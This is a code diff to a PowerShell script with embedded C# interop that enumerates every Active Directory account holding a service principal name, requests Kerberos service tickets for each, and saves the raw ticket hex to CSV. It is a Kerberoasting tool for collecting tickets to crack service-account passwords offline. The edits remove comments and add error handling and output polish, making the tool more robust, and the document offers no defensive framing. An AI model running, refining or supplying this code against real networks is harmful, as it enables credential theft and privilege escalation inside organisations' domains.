@@ -75,7 +75,7 @@ public class K {
             if (AcquireCredentialsHandle(
                     null,
                     "Kerberos",
-                    0x00000002, // SECPKG_CRED_OUTBOUND
+                    0x00000002,
                     IntPtr.Zero,
                     IntPtr.Zero,
                     IntPtr.Zero,
@@ -88,7 +88,7 @@ public class K {
                     cred,
                     IntPtr.Zero,
                     spn,
-                    0x00001000, // ISC_REQ_ALLOCATE_MEMORY
+                    0x00001000,
                     0,
                     16,
                     IntPtr.Zero,
@@ -121,38 +121,58 @@ public class K {
 "@
 
 function Get-KerberosTicketsForAllSPNs {
-    param(
-        [switch] $ExportToCsv
+    param (
+        [switch]$ExportToCsv
     )
 
-    Write-Host "`nRequesting TGS for SPNs:`n"
+    Write-Host "`nRequesting TGS for SPNs:`n" -ForegroundColor Cyan
 
-    $users = Get-ADUser -Filter { ServicePrincipalName -like "*" } -Properties ServicePrincipalName
-    $results = @()
+    try {
+        $results = Get-ADUser -Filter { ServicePrincipalName -like "*" } -Properties ServicePrincipalName, SamAccountName
+    } catch {
+        Write-Error "Failed to query Active Directory. Ensure RSAT tools are installed and you are authenticated."
+        return
+    }
 
-    foreach ($user in $users) {
-        foreach ($spn in $user.ServicePrincipalName) {
-            Write-Host "  → ${spn}"
+    $output = @()
+
+    foreach ($r in $results) {
+        foreach ($spn in $r.ServicePrincipalName) {
+
+            # Skip known unsafe SPNs
+            if ($spn -match "^kadmin/changepw") {
+                Write-Warning "Skipping unstable SPN: $spn"
+                continue
+            }
+
+            Write-Host "  → $spn" -ForegroundColor Yellow
 
             try {
                 $ticket = [K]::GetTicket($spn)
-                $results += [PSCustomObject]@{
-                    SamAccountName = $user.SamAccountName
-                    SPN            = $spn
-                    TicketHex      = $ticket
+                if ($ticket) {
+                    $output += [pscustomobject]@{
+                        User            = $r.SamAccountName
+                        SPN             = $spn
+                        TicketHex       = $ticket
+                    }
+                } else {
+                    Write-Warning "No ticket received for $spn"
                 }
+            } catch [System.AccessViolationException] {
+                Write-Warning "AccessViolationException: Unstable memory for SPN $spn. Skipping."
             } catch {
-                Write-Warning ("Failed to request ticket for ${spn}: " + $_)
+                Write-Warning ("Failed to request ticket for SPN `"$spn`": " + $_.Exception.Message)
             }
         }
     }
 
-    if ($ExportToCsv) {
-        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
-        $path = "KerberosTickets_$timestamp.csv"
-        $results | Export-Csv -Path $path -NoTypeInformation -Encoding UTF8
-        Write-Host "`nResults exported to: $path"
+    if ($ExportToCsv -and $output.Count -gt 0) {
+        $csv = "kerberos_tickets_$(Get-Date -Format yyyyMMdd_HHmmss).csv"
+        $output | Export-Csv -Path $csv -NoTypeInformation -Encoding UTF8
+        Write-Host "`nExported results to $csv" -ForegroundColor Green
+    } elseif ($output.Count -eq 0) {
+        Write-Warning "`nNo tickets collected."
     } else {
-        $results
+        $output | Format-Table -AutoSize
     }
 }
